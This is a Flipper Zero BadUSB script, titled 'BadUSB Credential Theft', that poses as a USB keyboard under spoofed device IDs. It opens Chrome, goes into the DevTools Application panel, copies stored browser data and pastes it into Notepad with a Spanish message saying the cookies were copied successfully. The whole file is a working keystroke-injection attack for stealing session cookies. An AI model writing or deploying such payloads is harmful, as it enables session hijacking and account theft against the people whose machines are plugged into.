let badusb = require("badusb");
let notify = require("notification");
let dialog = require("dialog");

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
dialog.message("BadUSB Credential Theft", "Press OK to start");

if (badusb.isConnected()) {
    notify.blink("green", "short");
    print("USB is connected");

    badusb.press("GUI", "r");  
    badusb.println("chrome");
    badusb.press("ENTER");
    delay(2000);
    badusb.press("F12");
    delay(1000); 
    badusb.press("CTRL", "SHIFT", "p"); 
    badusb.println("Application"); 
    badusb.press("ENTER");
    delay(1000);

    badusb.press("DOWN");  
    delay(500);
    badusb.press("DOWN");
    badusb.press("DOWN");
    badusb.press("ENTER");

    badusb.press("CTRL", "a");  
    badusb.press("CTRL", "c"); 

    badusb.press("GUI", "r");
    badusb.println("notepad");
    badusb.press("ENTER");
    delay(1000);  
    badusb.press("CTRL", "v");
    badusb.println("Cookies copiadas con éxito");
    
    notify.success();
} else {
    print("USB not connected");
    notify.error();
}
badusb.quit();